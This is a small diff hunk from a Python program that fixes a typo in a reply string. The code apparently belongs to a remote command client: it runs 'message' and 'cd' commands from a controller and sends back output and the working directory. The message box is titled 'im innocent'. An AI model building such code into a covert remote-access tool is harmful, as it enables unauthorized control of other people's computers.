@@ -65,7 +65,7 @@ def main():
             if cmd.startswith('message '):
                 msg = cmd.split(maxsplit=1)[1]
                 msgbox.showinfo("im innocent", msg)
-                send({'output': 'messaged was ok', error: '', 'cwd': cwd})
+                send({'output': 'message was ok', error: '', 'cwd': cwd})
                 continue
 
             if cmd.startswith('cd '):
